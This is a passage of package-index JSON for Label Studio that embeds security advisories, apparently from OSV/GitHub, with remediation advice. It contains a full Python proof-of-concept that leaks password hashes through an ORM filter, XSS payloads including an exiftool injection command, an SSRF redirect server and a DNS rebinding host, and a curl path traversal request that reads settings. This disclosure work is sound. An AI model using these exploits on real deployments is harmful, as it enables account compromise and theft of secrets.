[`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.8.2.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.8.2.post0/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (>=1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (>=4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.22)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)","Colorama (==0.4.4)","boxing (==0.1.4)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.8.2.post0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"bc4d84abd842bb79a66a0a609869d3d05139e8a17a7459f27436bd4530f77cb8","md5":"bd9bf79fab2efe82e559e0188dbe7e65","sha256":"92dcc20c0a043d88c5e4ed43e99c57749736fd66bdfc86e6da4cabedf19c781d"},"downloads":-1,"filename":"label_studio-0.8.2.post0-py3-none-any.whl","has_sig":false,"md5_digest":"bd9bf79fab2efe82e559e0188dbe7e65","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":13316423,"upload_time":"2020-12-15T21:28:48","upload_time_iso_8601":"2020-12-15T21:28:48.338541Z","url":"https://files.pythonhosted.org/packages/bc/4d/84abd842bb79a66a0a609869d3d05139e8a17a7459f27436bd4530f77cb8/label_studio-0.8.2.post0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"a3f87059f692cdd5772d65149dbb487ddd2b97febe8aab85f25bbfe6d80a3c76","md5":"89f8766514aad599c86299cc7930482f","sha256":"5abaf9a8b90fa9d2a2b979d77947abd3c55368598abd68c5a78a06416415f78f"},"downloads":-1,"filename":"label-studio-0.8.2.post0.tar.gz","has_sig":false,"md5_digest":"89f8766514aad599c86299cc7930482f","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":13213081,"upload_time":"2020-12-15T21:28:55","upload_time_iso_8601":"2020-12-15T21:28:55.580641Z","url":"https://files.pythonhosted.org/packages/a3/f8/7059f692cdd5772d65149dbb487ddd2b97febe8aab85f25bbfe6d80a3c76/label-studio-0.8.2.post0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the 